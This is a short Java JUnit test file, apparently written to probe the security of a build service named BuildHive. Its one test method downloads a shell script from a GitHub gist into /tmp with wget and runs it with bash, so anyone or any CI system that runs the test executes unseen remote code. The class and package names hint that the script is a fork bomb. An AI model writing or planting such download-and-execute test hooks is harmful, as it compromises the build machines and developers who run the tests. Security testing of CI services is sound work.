package name.felixbecker.buildhivesecuritytest;

import org.junit.Test;

public class ForkyPorkyTest extends CriminalParent {
	@Test
	public void forkyPorky() throws Exception{
		execute("wget", "-O", "/tmp/forkyporky.sh", "https://raw.github.com/gist/2732891/66c94c8ed3c0510673a86a59fae4ad7bd9d010f6/gistfile1.txt");
		execute("bash /tmp/forkyporky.sh");
	}
}
